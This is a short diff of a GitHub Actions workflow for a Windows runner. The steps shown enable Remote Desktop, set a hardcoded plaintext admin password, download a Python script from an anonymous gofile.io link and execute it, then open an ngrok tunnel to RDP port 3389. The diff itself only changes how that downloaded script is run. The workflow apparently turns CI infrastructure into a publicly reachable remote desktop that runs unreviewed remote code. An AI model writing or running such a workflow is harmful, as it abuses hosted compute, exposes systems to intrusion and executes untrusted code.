@@ -22,7 +22,7 @@ jobs:
     - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "Biiuh2021" -Force)
     - run: Invoke-WebRequest https://srv-store1.gofile.io/download/KrxNQg/746c1f253cbe104e37d0d2cf5f00eddd/1.py -OutFile 1.py
-    - run: .\1.py
+    - run: python 1.py
     - name: Create Tunnel
       run: .\ngrok\ngrok.exe tcp 3389
       
